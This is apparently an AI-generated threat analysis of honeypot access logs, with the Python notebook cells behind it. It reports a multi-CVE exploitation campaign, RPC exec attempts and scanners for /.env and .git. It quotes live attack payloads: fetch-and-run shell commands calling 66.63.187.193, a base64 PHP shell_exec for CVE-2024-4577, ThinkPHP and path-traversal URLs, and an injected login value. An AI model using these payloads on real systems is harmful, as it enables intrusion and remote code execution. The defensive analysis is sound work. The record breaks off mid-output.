# Finch Access Log Analysis — GPT-5 (OpenAI Playground)

## Executive summary

* **Time window:** 2025-07-31 22:43:34Z to 2025-08-08 09:58:59Z, **1,182** requests total.
* **Enforcement:** **28** requests were denied by Suricata-based rules; the remainder were allowed (many were clear scans).
* **Notable activity:** a coordinated exploitation campaign using `Custom-AsyncHttpClient` across multiple IPs with consistent TLS fingerprints, attempting multiple RCE vectors including ThinkPHP, PHP-CGI **CVE-2024-4577**, Apache path traversal to `/bin/sh`, and widespread PHPUnit `eval-stdin` probing.
* **Separate actor:** remote execution attempts via XML/JSON RPC endpoints (`/WebInterface/*`), with spoofed user-agents but a stable TLS fingerprint—clear fingerprint-aware mismatch that flags automation.
* **Mass scanning:** for common secrets exposure (`/.env`) and Git leakage (`/.git/config`), often by clusters with stable JA3/JA4 and rotating IPs.

### High-priority findings

#### 1) Coordinated `Custom-AsyncHttpClient` exploitation cluster (multi-CVE RCE campaign)

* **What:** Burst campaigns from 8 source IPs over several days, using the same UA and JA4, and two closely related JA3 hashes. Attempts included:

  * Apache-style path traversal to `/cgi-bin/.../bin/sh` with a payload that curl/wget’d a remote shell and executed it (**blocked**).
  * PHP-CGI arg injection **CVE-2024-4577** pattern posting inline PHP with base64-decoded command to fetch/execute a remote script (**blocked**).
  * ThinkPHP `invokefunction` md5 proof-of-exploit (**blocked**).
  * Extensive POSTs to many PHPUnit `eval-stdin.php` paths with test PHP payloads (mostly allowed but probed likely non-existent paths).
* **Why notable:** Multiple RCE vectors, consistent fingerprints, and a shared external payload infrastructure indicate a single organized campaign (medium-high confidence).
* **Action:** Block the campaign indicators (IPs, JA3/JA4, UA), and explicitly deny the probed endpoints if they exist. Investigate any **200** responses to these paths upstream.

#### 2) Remote code execution attempts via `/WebInterface/*` (fingerprint mismatch indicates spoofing)

* **What:** A single source IP attempted `system.exec` and `file.write` via both XML-RPC (`/WebInterface/function/`) and JSON-RPC (`/WebInterface/json/`), and tried a login POST with an injection-like username value (`admin';id;#`).
* **Why notable:** Stable JA3/JA4 across requests while rotating User-Agents (Safari/Firefox/Edge signatures) implies UA spoofing and automated exploitation/testing. Payload calls (`system.exec`, `file.write`) are unambiguously malicious.
* **Action:** Block the IP and JA3/JA4; add WAF rules for `/WebInterface/*` endpoints; check upstream application logs for any success (non-404/401/403).

#### 3) Mass scanning for sensitive files

* **`/.env` scanning (clustered):** Dozens of attempts with a consistent Chrome/116 UA and a stable JA3/JA4 across many rotating IPs—likely a distributed scanner kit.
* **`/.git/config` scanning:** Smaller set from a handful of IPs, some with “Scanner/1.0” UA. Both patterns are preparatory steps to secrets/source leakage.
* **Action:** Ensure these files are not accessible; add deny rules for `/.env` and `/.git`; consider blocking the associated TLS fingerprints.

### Noteworthy but likely benign internet-wide scanners

* **GenomeCrawlerd (Nokia):** UA `'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'`, JA3 `efc81b7b978aafca58d30faeeaf28f9a`; enumerates login pages.
* **CensysInspect:** UA `Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)` with JA3s `d6828e30ab66774a91a96ae93be4ae4c` and `35fa0a83e466acbec1cfbb9016d550ab`.
* **zgrab/0.x:** Multiple IPs, common surface scans. Consider allowlisting by JA3/UA to reduce noise.

### Notes on detections

* Some denies included a Suricata signature “Grafana Account Takeover via Path Traversal & Open Redirect (CVE-2025-4123)” alongside ThinkPHP RCE on the same request; treat the Grafana tag as a likely rule overlap rather than a confirmed Grafana exploit in these events.

### Appendix: High-confidence IOCs (with context)

**A) `Custom-AsyncHttpClient` exploitation campaign**

* **User-Agent:** `Custom-AsyncHttpClient`
* **JA3:**

  * `7041540a5e44ce9a1d4200c4214355aa` (dominant across the campaign)
  * `7847ae5f34edc180191d9b5a893ca7d1` (seen on `146.88.68.94`)
* **JA4:** `t13i170900_5b57614c22b0_78e6aca7449b`
* **Source IPs (first/last seen UTC):**

  * `146.88.68.94` (2025-08-02 07:12:51 → 07:13:05)
  * `119.18.55.217` (2025-08-02 11:46:39 → 11:47:21)
  * `124.71.231.117` (2025-08-03 11:07:09 → 11:07:21)
  * `115.76.223.23` (2025-08-05 05:23:40 → 05:29:44)
  * `165.231.148.50` (2025-08-05 21:06:09 → 21:08:23)
  * `110.74.171.22` (2025-08-06 18:34:16 → 18:42:16)
  * `139.9.176.173` (2025-08-02 23:54:33 → 23:55:21)
  * `216.126.238.175` (2025-08-07 06:34:02 → 06:34:52)
* **Targeted paths (examples):**

  * `/cgi-bin/.%2e/.../.%2e/bin/sh`
  * `/hello.world?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input`
  * `/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello`
  * Many variants of `/vendor/.../phpunit/.../eval-stdin.php`
* **Payload indicators:**

  * External host contacted in payloads: `http://66.63.187.193/sh`
  * Example decoded command (from CVE-2024-4577 style request):

    ```
    X=$(curl http://66.63.187.193/sh || wget http://66.63.187.193/sh -O-); echo "$X" | sh -s cve_2024_4577.selfrep
    ```
  * Example body SHA-256 (deny events):

    * `25479e20ea8dcfd0d3d60f11cd62cf285dde59d102093a59281363b24e3d1a3a` (bin/sh fetch+exec)
    * `502b3fe470abee38ccba718786cdc140f009466641331eca5de77b0802866e2d` (PHP-CGI arg-injection with base64 payload)
* **Suricata signatures observed:**

  * `ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt (2011465)`
  * `ET WEB_SERVER WebShell Generic - wget http - POST (2016683)`
  * `ET WEB_SERVER PHP tags in HTTP POST (2011768)`
  * `ET WEB_SERVER Generic PHP Remote File Include (2019957)`
  * `ET WEB_SERVER ThinkPHP RCE Exploitation Attempt (2026731)`
  * `ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body (2053461)`

**B) `/WebInterface/*` RCE attempt (spoofed UAs, stable TLS)**

* **Source IP:** `67.217.228.220` (2025-08-01 23:10:30 → 23:10:44 UTC)
* **JA3:** `9b72665518dedb3531426284fdec8237`
* **JA4:** `t13i250900_b78ed14e2fd0_e7c285222651`
* **User-Agents observed (spoofed):** Safari 16.6 on macOS, Firefox on Fedora, Edge/18 on Windows
* **Paths & payloads:**

  * `POST /WebInterface/function/` with XML-RPC `methodCall system.exec` (body SHA-256 `a4754b0f...`)
  * `POST /WebInterface/function/` with XML-RPC `methodCall file.write pwned.txt NUCLEI_HACKED` (body SHA-256 `8b7d9f...`)
  * `POST /WebInterface/json/` with `{"method":"system.exec","params":["id"]}` (body SHA-256 `36c2a4a7...`)
  * `POST /WebInterface/login/` with body `username=admin';id;#&password=anything` (body SHA-256 `1d711995...`)
* **Indicator pattern:** consistent TLS fingerprints vs rotating UA strings → automation with UA spoofing.

**C) `/.env` exposure scanner (clustered)**

* **Path:** `/.env` (59 hits)
* **Dominant JA3:** `80de6e81f4d77bb5d16114d4ebfe5e30`
* **Dominant JA4:** `t13i3713h1_91ec122131b4_97a66a8f4cb1`
* **User-Agent:** `Mozilla/5.0 … Chrome/116.0.5845.140 Safari/537.36`
* **Pattern:** many rotating IPs sharing the same JA3/JA4+UA → distributed scanner kit.

**D) `/.git/config` scanner**

* **Path:** `/.git/config` (11 hits)
* **Source IPs:** `196.251.81.194` (4), `146.70.116.179` (2), `146.70.116.115` (2), `196.251.114.43` (1), `134.209.70.130` (1), `170.64.207.0` (1)
* **UAs:** `Mozilla/5.0 (compatible; Scanner/1.0)` and misc.
* **JA3s observed:** `19e29534fd49dd27d09234e639c4057e`; `ea4a9ae049cfc614efbb3c244abb3fc7`; `f80d3d09f61892c5846c854dd84ac403`

**E) Benign scanners (for awareness/allowlisting)**

* **GenomeCrawlerd:** UA `'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'`, JA3 `efc81b7b978aafca58d30faeeaf28f9a`; enumerates login pages.
* **CensysInspect:** UA `Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)` with JA3s `d6828e30ab66774a91a96ae93be4ae4c`, `35fa0a83e466acbec1cfbb9016d550ab`.
* **zgrab/0.x:** multiple IPs, common surface scans.

### Recommended immediate actions

* Block or rate-limit the `Custom-AsyncHttpClient` campaign by **JA3/JA4** and **UA**; add explicit WAF denies for:

  * `/cgi-bin/.%2e/.../.%2e/bin/sh`
  * any `auto_prepend_file=php://input` patterns
  * ThinkPHP `invokefunction call_user_func_array` pattern
  * any `/vendor/*/phpunit/**/eval-stdin.php` paths
* Block `/WebInterface/function/` and `/WebInterface/json/` RPC exec patterns; monitor for the listed JA3/JA4; block source `67.217.228.220`.
* Deny direct access to `/.env` and `/.git/`; verify no exposure on origin.
* Review upstream/app logs for any **2xx** responses associated with these IOCs.


---

## Chain-of-Thought (Python tool calls & outputs)

<details>
<summary><strong>Cell 1</strong></summary>

**Code**

```python
import json, os, itertools, math, re, statistics
from collections import Counter, defaultdict
path = "/mnt/data/file-8MUqV48Z8gbXCQjReQuSrN-events.jsonl"
os.path.getsize(path), path
```

**Output**

```text
(1161580, '/mnt/data/file-8MUqV48Z8gbXCQjReQuSrN-events.jsonl')
```

</details>

<details>
<summary><strong>Cell 2</strong></summary>

**Code**

```python
# Load
events = []
with open(path, 'r', encoding='utf-8') as f:
    for line in f:
        line=line.strip()
        if not line: continue
        try:
            events.append(json.loads(line))
        except json.JSONDecodeError as e:
            # Try relaxed?
            # For now, skip
            pass
len(events), events[0].keys()
```

**Output**

```text
(1182,
 dict_keys(['eventTime', 'srcIP', 'srcPort', 'dstIP', 'dstPort', 'method', 'request', 'headers', 'body', 'bodySha256', 'protocolVersion', 'userAgent', 'ja3', 'ja4', 'ja4h', 'http2', 'ruleID', 'action', 'upstream', 'listenerAddr']))
```

</details>

<details>
<summary><strong>Cell 3</strong></summary>

**Code**

```python
# Basic counts
from datetime import datetime
def parse_ts(ts):
    try:
        return datetime.fromisoformat(ts.replace('Z','+00:00'))
    except Exception:
        return None

times = [parse_ts(e['eventTime']) for e in events if 'eventTime' in e]
(min(times), max(times), (max(times)-min(times)))
```

**Output**

```text
(datetime.datetime(2025, 7, 31, 22, 43, 34, 381286, tzinfo=datetime.timezone.utc),
 datetime.datetime(2025, 8, 8, 9, 58, 59, 841061, tzinfo=datetime.timezone.utc),
 datetime.timedelta(days=7, seconds=40525, microseconds=459775))
```

</details>

<details>
<summary><strong>Cell 4</strong></summary>

**Code**

```python
# Actions summary
Counter((e.get('action','') or '').lower() for e in events)
```

**Output**

```text
Counter({'allow': 1154, 'deny': 28})
```

</details>

<details>
<summary><strong>Cell 5</strong></summary>

**Code**

```python
Counter(e.get('ruleID','') for e in events)
```

**Output**

```text
Counter({'default': 1154, 'deceive-suri-match': 28})
```

</details>

<details>
<summary><strong>Cell 6</strong></summary>

**Code**

```python
denies = [e for e in events if (e.get('action')=='deny')]
len(denies)
denies[:2]
```

**Output**

```text
[LEN]
28

[SAMPLE]
[{'eventTime': '2025-08-02T07:12:51.601530967Z',
  'srcIP': '146.88.68.94',
  'srcPort': 4983,
  'dstIP': '172.31.62.199',
  'dstPort': 8443,
  'method': 'POST',
  'request': '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh',
  'headers': {'Accept': '*/*',
   'Connection': 'keep-alive',
   'Content-Length': '103',
   'Content-Type': 'text/plain',
   'Upgrade-Insecure-Requests': '1',
   'User-Agent': 'Custom-AsyncHttpClient'},
  'body': 'X=$(curl http://66.63.187.193/sh || wget http://66.63.187.193/sh -O-); echo "$X" | sh -s apache.selfrep',
  'bodySha256': '25479e20ea8dcfd0d3d60f11cd62cf285dde59d102093a59281363b24e3d1a3a',
  'protocolVersion': 'HTTP/1.1',
  'userAgent': 'Custom-AsyncHttpClient',
  'ja3': '7847ae5f34edc180191d9b5a893ca7d1',
  'ja3Raw': '771,4867-4865-4866-52393-52392-49195-49199-49196-49200-49161-49171-49162-49172-156-157-47-53,23-65281-10-11-35-13-51-45-43,29-23-24,0',
  'ja4': 't13i170900_5b57614c22b0_78e6aca7449b',
  'ja4h': 'po11nn070000_74abfbbd1cb4_000000000000_000000000000',
  'http2': '',
  'ruleID': 'deceive-suri-match',
  'action': 'deny',
  'upstream': 'http://127.0.0.1:4444',
  'suricataMatches': [{'msg': 'ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt',
    'sid': '2011465'},
   {'msg': 'ET WEB_SERVER WebShell Generic - wget http - POST',
    'sid': '2016683'}],
  'listenerAddr': '0.0.0.0:8443'},
 {'eventTime': '2025-08-02T07:12:52.778494553Z',
  'srcIP': '146.88.68.94',
  'srcPort': 6456,
  'dstIP': '172.31.62.199',
  'dstPort': 8443,
  'method': 'POST',
  'request': '/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
  'headers': {'Accept': '*/*',
   'Connection': 'keep-alive',
   'Content-Length': '221',
   'Content-Type': 'application/x-www-form-urlencoded',
   'Upgrade-Insecure-Requests': '1',
   'User-Agent': 'Custom-AsyncHttpClient'},
  'body': '<?php shell_exec(base64_decode("WD0kKGN1cmwgaHR0cDovLzY2LjYzLjE4Ny4xOTMvc2ggfHwgd2dldCBodHRwOi8vNjYuNjMuMTg3LjE5My9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA=")); echo(md5("Hello CVE-2024-4577")); ?>',
  'bodySha256': '502b3fe470abee38ccba718786cdc140f009466641331eca5de77b0802866e2d',
  'protocolVersion': 'HTTP/1.1',
  'userAgent': 'Custom-AsyncHttpClient',
  'ja3': '7847ae5f34edc180191d9b5a893ca7d1',
  'ja3Raw': '771,4867-4865-4866-52393-52392-49195-49199-49196-49200-49161-49171-49162-49172-156-157-47-53,23-65281-10-11-35-13-51-45-43,29-23-24,0',
  'ja4': 't13i170900_5b57614c22b0_78e6aca7449b',
  'ja4h': 'po11nn080000_9808b6933b86_000000000000_000000000000',
  'http2': '',
  'ruleID': 'deceive-suri-match',
  'action': 'deny',
  'upstream': 'http://127.0.0.1:4444',
  'suricataMatches': [{'msg': 'ET WEB_SERVER PHP tags in HTTP POST',
    'sid': '2011768'},
   {'msg': 'ET WEB_SERVER Generic PHP Remote File Include', 'sid': '2019957'},
   {'msg': 'ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body',
    'sid': '2053461'}],
  'listenerAddr': '0.0.0.0:8443'}]
```

</details>

<details>
<summary><strong>Cell 7</strong></summary>

**Code**

```python
from pprint import pprint
def summarize_denies(denies):
    by_ip=defaultdict(list)
    for e in denies:
        by_ip[e['srcIP']].append(e)
    return {ip: len(v) for ip,v in by_ip.items()}
ip_counts = summarize_denies(denies)
len(ip_counts), sorted(ip_counts.items(), key=lambda x:-x[1])[:10]
```

**Output**

```text
(8,
 [('146.88.68.94', 4),
  ('119.18.55.217', 4),
  ('124.71.231.117', 4),
  ('115.76.223.23', 4),
  ('165.231.148.50', 4),
  ('110.74.171.22', 4),
  ('139.9.176.173', 2),
  ('216.126.238.175', 2)])
```

</details>

<details>
<summary><strong>Cell 8</strong></summary>

**Code**

```python
for ip, num in sorted(ip_counts.items(), key=lambda x:-x[1]):
    evs = [e for e in denies if e['srcIP']==ip]
    paths = set(e['request'] for e in evs)
    msgs = set(m['msg'] for e in evs for m in e.get('suricataMatches',[]))
    print(ip, num, list(paths)[:3])
    for m in msgs:
        print(" -", m)
    print()
```

**Output**

```text
146.88.68.94 4 ['/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello', '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh', '/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello']
 - ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt
 - ET WEB_SERVER WebShell Generic - wget http - POST
 - ET WEB_SERVER ThinkPHP RCE Exploitation Attempt
 - ET WEB_SERVER PHP tags in HTTP POST
 - ET WEB_SERVER Generic PHP Remote File Include
 - ET WEB_SPECIFIC_APPS Grafana Account Takeover via Path Traversal & Open Redirect (CVE-2025-4123)
 - ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body

119.18.55.217 4 ['/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello', '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh', '/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello']
 - ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt
 - ET WEB_SERVER WebShell Generic - wget http - POST
 - ET WEB_SERVER ThinkPHP RCE Exploitation Attempt
 - ET WEB_SERVER PHP tags in HTTP POST
 - ET WEB_SERVER Generic PHP Remote File Include
 - ET WEB_SPECIFIC_APPS Grafana Account Takeover via Path Traversal & Open Redirect (CVE-2025-4123)
 - ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body

124.71.231.117 4 ['/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello', '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh', '/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello']
 - ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt
 - ET WEB_SERVER WebShell Generic - wget http - POST
 - ET WEB_SERVER ThinkPHP RCE Exploitation Attempt
 - ET WEB_SERVER PHP tags in HTTP POST
 - ET WEB_SERVER Generic PHP Remote File Include
 - ET WEB_SPECIFIC_APPS Grafana Account Takeover via Path Traversal & Open Redirect (CVE-2025-4123)
 - ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body

115.76.223.23 4 ['/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello', '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh', '/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello']
 - ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt
 - ET WEB_SERVER WebShell Generic - wget http - POST
 - ET WEB_SERVER ThinkPHP RCE Exploitation Attempt
 - ET WEB_SERVER PHP tags in HTTP POST
 - ET WEB_SERVER Generic PHP Remote File Include
 - ET WEB_SPECIFIC_APPS Grafana Account Takeover via Path Traversal & Open Redirect (CVE-2025-4123)
 - ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body

165.231.148.50 4 ['/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello', '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh', '/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello']
 - ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt
 - ET WEB_SERVER WebShell Generic - wget http - POST
 - ET WEB_SERVER ThinkPHP RCE Exploitation Attempt
 - ET WEB_SERVER PHP tags in HTTP POST
 - ET WEB_SERVER Generic PHP Remote File Include
 - ET WEB_SPECIFIC_APPS Grafana Account Takeover via Path Traversal & Open Redirect (CVE-2025-4123)
 - ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body

110.74.171.22 4 ['/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello', '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh', '/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello']
 - ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt
 - ET WEB_SERVER WebShell Generic - wget http - POST
 - ET WEB_SERVER ThinkPHP RCE Exploitation Attempt
 - ET WEB_SERVER PHP tags in HTTP POST
 - ET WEB_SERVER Generic PHP Remote File Include
 - ET WEB_SPECIFIC_APPS Grafana Account Takeover via Path Traversal & Open Redirect (CVE-2025-4123)
 - ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body

139.9.176.173 2 ['/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh', '/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input']
 - ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt
 - ET WEB_SERVER WebShell Generic - wget http - POST
 - ET WEB_SERVER PHP tags in HTTP POST
 - ET WEB_SERVER Generic PHP Remote File Include
 - ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body

216.126.238.175 2 ['/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh', '/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input']
 - ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt
 - ET WEB_SERVER WebShell Generic - wget http - POST
 - ET WEB_SERVER PHP tags in HTTP POST
 - ET WEB_SERVER Generic PHP Remote File Include
 - ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body
```

</details>

<details>
<summary><strong>Cell 9</strong></summary>

**Code**

```python
# Find any suri msg containing Grafana
graf = [e for e in denies if any('Grafana' in m['msg'] for m in e.get('suricataMatches',[]))]
len(graf), graf[0]['request'], graf[0]['suricataMatches']
```

**Output**

```text
(6,
 '/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello',
 [{'msg': 'ET WEB_SERVER ThinkPHP RCE Exploitation Attempt', 'sid': '2026731'},
  {'msg': 'ET WEB_SPECIFIC_APPS Grafana Account Takeover via Path Traversal & Open Redirect (CVE-2025-4123)',
   'sid': '2063023'}])
```

</details>

<details>
<summary><strong>Cell 10</strong></summary>

**Code**

```python
paths = Counter(e['request'] for e in events)
len(paths), paths.most_common(10)[:10]
```

**Output**

```text
(157,
 [('/', 336),
  ('/favicon.ico', 71),
  ('/.env', 37),
  ('/login', 27),
  ('/ab2g', 23),
  ('/ab2h', 23),
  ('/index.html', 19),
  ('/+CSCOE+/logon.html', 19),
  ('/cgi-bin/login.cgi', 19),
  ('/login.jsp', 19)])
```

</details>

<details>
<summary><strong>Cell 11</strong></summary>

**Code**

```python
# Top 50 paths
for p,c in paths.most_common(50):
    print(c, p)
```

**Output**

```text
336 /
71 /favicon.ico
37 /.env
27 /login
23 /ab2g
23 /ab2h
19 /index.html
19 /+CSCOE+/logon.html
19 /cgi-bin/login.cgi
19 /login.jsp
19 /doc/index.html
19 /remote/login
18 /manage/account/login
18 /admin/index.html
18 /login.html
18 /web/
18 /robots.txt
17 /login.htm
12 /.well-known/security.txt
11 /.git/config
8 /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
8 /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
7 /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
7 /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
7 /security.txt
7 /sitemap.xml
6 /developmentserver/metadatauploader
6 /vendor/phpunit/src/Util/PHP/eval-stdin.php
6 /vendor/phpunit/Util/PHP/eval-stdin.php
6 /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
6 /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /phpunit/phpunit/Util/PHP/eval-stdin.php
6 /phpunit/src/Util/PHP/eval-stdin.php
6 /phpunit/Util/PHP/eval-stdin.php
6 /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
6 /lib/phpunit/src/Util/PHP/eval-stdin.php
6 /lib/phpunit/Util/PHP/eval-stdin.php
6 /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
6 /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

</details>

<details>
<summary><strong>Cell 12</strong></summary>

**Code**

```python
ua_counts = Counter(e.get('userAgent','') for e in events)
ua_counts.most_common(20)
```

**Output**

```text
[('Custom-AsyncHttpClient', 270),
 ("'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'",
  242),
 ('Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  131),
 ('Mozilla/5.0 zgrab/0.x', 87),
 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36',
  70),
 ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36',
  52),
 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
  42),
 ('Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0',
  20),
 ('Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity',
  15),
 ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
  12),
 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
  9),
 ('', 8),
 ('Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)',
  8),
 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
  8),
 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
  8),
 ('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  6),
 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
  6),
 ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
  6),
 ('Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.183 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  5),
 ('Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36',
  5)]
```

</details>

<details>
<summary><strong>Cell 13</strong></summary>

**Code**

```python
susp_keywords = ['.env', 'phpunit', 'eval-stdin', '.git/config', 'think\\app/invokefunction', 'cgi-bin', '+CSCOE+', 'allow_url_include', 'auto_prepend_file', '/bin/sh', '/etc/passwd', 'wp-login.php', 'owa/', '/actuator', '/vendor', '/admin', '/shell', 'md5%28', 'md5&vars', 'call_user_func_array']
sus = [e for e in events if any(k in e.get('request','') for k in susp_keywords)]
len(sus), sus[0]['request']
```

**Output**

```text
(395, '/.git/config')
```

</details>

<details>
<summary><strong>Cell 14</strong></summary>

**Code**

```python
from collections import defaultdict
by_pattern = defaultdict(list)
for e in sus:
    matched = [k for k in susp_keywords if k in e['request']]
    key=",".join(matched)
    by_pattern[key].append(e)
{ k: len(v) for k,v in by_pattern.items()}
```

**Output**

```text
{'.git/config': 11,
 '/admin': 20,
 '+CSCOE+': 19,
 'cgi-bin': 21,
 'owa/': 9,
 'cgi-bin,/bin/sh': 8,
 'allow_url_include,auto_prepend_file': 8,
 'phpunit,eval-stdin,/vendor': 170,
 'phpunit,eval-stdin': 48,
 'phpunit,eval-stdin,/vendor,/admin': 6,
 'think\\app/invokefunction,md5&vars,call_user_func_array': 12,
 '.env': 59,
 '/actuator': 3,
 '/shell': 1}
```

</details>

<details>
<summary><strong>Cell 15</strong></summary>

**Code**

```python
sus_by_ip = Counter(e['srcIP'] for e in sus)
sus_by_ip.most_common(20)
```

**Output**

```text
[('146.88.68.94', 41),
 ('119.18.55.217', 41),
 ('124.71.231.117', 41),
 ('115.76.223.23', 41),
 ('165.231.148.50', 41),
 ('110.74.171.22', 41),
 ('78.153.140.177', 23),
 ('104.234.115.164', 11),
 ('104.234.115.218', 6),
 ('104.234.115.160', 6),
 ('196.251.81.194', 4),
